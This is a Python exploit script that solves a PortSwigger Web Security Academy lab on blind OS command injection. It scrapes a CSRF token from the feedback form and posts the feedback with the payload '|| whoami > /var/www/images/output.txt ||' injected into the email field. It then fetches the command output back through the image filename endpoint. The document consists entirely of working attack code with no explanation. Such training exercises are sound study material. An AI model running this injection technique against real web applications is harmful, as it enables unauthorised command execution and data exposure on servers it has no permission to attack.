"""
https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
"""

import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

feedback_url = f'https://{site}/feedback'
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

feedback_submit_url = f'https://{site}/feedback/submit'
post_data = {
    'csrf' : csrf,
    'name' : 'a',
    'email' : '|| whoami > /var/www/images/output.txt ||',
    'subject' : 'a',
    'message' : 'a'
}
resp = s.post(feedback_submit_url, data=post_data)
print(resp.status_code)

output_file_url = f'https://{site}/image?filename=output.txt'
resp = s.get(output_file_url)
print(resp.text)